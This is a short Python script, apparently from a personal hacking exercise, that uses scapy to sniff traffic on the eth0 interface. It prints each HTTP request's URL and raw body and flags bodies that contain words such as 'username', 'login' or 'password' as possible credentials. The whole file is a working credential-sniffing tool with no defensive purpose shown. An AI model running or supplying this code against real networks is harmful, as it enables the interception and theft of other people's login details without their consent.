#!usr/bin/env python

# INSTALL THE FOLLOWING PYTHON MODULES:
# - pip3 install scapy
# - pip3 install scapy_http
import sys

import scapy.all as scapy
from scapy.layers import http

#
def sniff(interface):
    # iface: specify the interface used to sniff on.
    # store: I tell scapy to not store packets in memory.
    # prn: allows to specify a callback function (a function that is call every time that the sniff() function sniff
    #      a packet.
    # OPTIONAL FILTERS: uses to specifies filters packets using "BPF syntax"
    #         SOME FILTER EXAMPLES:
    #           - udp: filter UDP packets
    #           - arp: filter ARP packets
    #           - tcp: filter TCP packets
    #           - port 21: filter packets on a specific port
    # DOCUMENTATION LINK: https://scapy.readthedocs.io/en/latest/extending.html
    #scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter=80)
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    #print(packet)
    # Check if our packet has HTTP layer. If our packet has the HTTP layer and it is HTTPRequest.
    # In this way I am excluding some garbage information in which I am not interested into.

    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())

        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        url = url.decode("utf-8")
        print("[+] HTTP Request: " + url)

        # Login information are conteined into the load field of the "Raw" layer inside the previous
        # container "http.HTTPRequest" layer:
        if(packet.haslayer(scapy.Raw)):
            print(packet[scapy.Raw].load)            # Print only the information contained into the "Raw" layer

            load = packet[scapy.Raw].load

            try:
                load = load.decode("utf-8")

                keywords = ["username", "user", "login", "email", "e-mail", "mail", "password", "pass", "pswd"]

                for keyword in keywords:
                    if keyword in load:
                        print("\n\n[+] Possibile username/password: " + load + "\n\n")
                        break
            except UnicodeDecodeError:
                print("\n\nThe packet Raw layer doesn't contain text. The content is:")
                print(load)

            print("--------------------------------------------------------------------------")


sniff("eth0")